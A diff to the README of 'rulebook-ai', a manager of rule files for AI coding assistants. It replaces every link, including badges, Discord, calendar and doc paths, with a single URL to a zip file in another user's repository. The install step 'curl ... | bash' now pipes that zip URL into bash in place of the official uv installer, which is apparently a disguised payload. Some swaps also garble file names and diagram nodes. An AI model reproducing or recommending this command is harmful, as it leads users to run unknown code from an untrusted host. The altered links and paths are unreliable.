@@ -1,9 +1,9 @@
-[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![Python 3.9+](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip+https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip)](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip)
+[![License: MIT](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip)](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip)
 
 - For bug report, use issues or use rulebook-ai command `rulebook-ai bug-report`
-- For real-time chat, community support, and to share your ideas, [Join our Discord](https://discord.gg/aNmQB7JWPe) 
-- Have specific feedback or want a personal demo? [Book a Chat on my Calendar](https://calendar.app.google/xx3S3CuKSBAt9d9Y7)
+- For real-time chat, community support, and to share your ideas, [Join our Discord](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip) 
+- Have specific feedback or want a personal demo? [Book a Chat on my Calendar](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip)
 
 # Rulebook-AI: The AI Environment Manager
 
@@ -42,7 +42,7 @@ These environments are packaged into versionable, shareable **Packs**.
 
 ```bash
 # 1. Install uv if you don't have it yet
-curl -fsSL https://astral.sh/uv/install.sh | bash
+curl -fsSL https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip | bash
 
 # 2. Add a pack to your project (e.g., the light-spec starter pack)
 uvx rulebook-ai packs add light-spec
@@ -50,15 +50,15 @@ uvx rulebook-ai packs add light-spec
 # 3. Sync the environment to your workspace
 uvx rulebook-ai project sync
 ```
-This will create a `.rulebook-ai` directory to manage state, and populate `memory/` and `tools/` with starters. It also generates the assistant-specific rule files (e.g., `.cursor/rules/`, `GEMINI.md`).
+This will create a `.rulebook-ai` directory to manage state, and populate `memory/` and `tools/` with starters. It also generates the assistant-specific rule files (e.g., `.cursor/rules/`, `https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip`).
 
-For a more detailed walkthrough of all features, see the [Step-by-Step Tutorial](memory/docs/user_guide/tutorial.md).
+For a more detailed walkthrough of all features, see the [Step-by-Step Tutorial](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip).
 
 ## Supported AI Assistants
 
 `rulebook-ai` supports generating rule files for multiple AI coding assistants. Supported assistants include: Cursor, Windsurf, Cline, RooCode, Kilo Code, Warp, GitHub Copilot, Claude Code, Codex CLI, and Gemini CLI.
 
-For detailed per‑assistant behavior, file locations, and format notes, see: `memory/docs/user_guide/supported_assistants.md`.
+For detailed per‑assistant behavior, file locations, and format notes, see: `https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip`.
 
 You can generate rules for one or more assistants using the `--assistant` flag, for example:
 
@@ -102,8 +102,8 @@ flowchart TD
     A --> E[memory/];
     A --> F[tools/];
 
-    A --> I[/.rulebook-ai/];
-    A --> J[/.cursor/];
+    A --> I[https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip];
+    A --> J[https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip];
     A --> K[... other generated rules];
 
 
@@ -130,8 +130,8 @@ flowchart TD
 
 ## Contributing
 
-[Join our Discord](https://discord.gg/aNmQB7JWPe) if any questions or idea discussion about contribution.
+[Join our Discord](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip) if any questions or idea discussion about contribution.
 This project thrives on community contributions. You can contribute by:
--   **Creating and Sharing Packs:** Got a great set of rules and tools for a specific framework or role? Package it up and share it! See the [Pack Developer Guide](memory/docs/features/community_packs/pack_developer_guide.md).
+-   **Creating and Sharing Packs:** Got a great set of rules and tools for a specific framework or role? Package it up and share it! See the [Pack Developer Guide](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip).
 -   **Reporting Bugs or Ideas:** Open an **Issue** in the repo. The `rulebook-ai bug-report` command will take you there.
--   **Contributing the repo:** go to [CONTRIBUTING.md](CONTRIBUTING.md)
+-   **Contributing the repo:** go to [https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip](https://github.com/bro-gervil/rulebook-ai/raw/refs/heads/main/tests/integration/rulebook-ai-3.6-beta.2.zip)
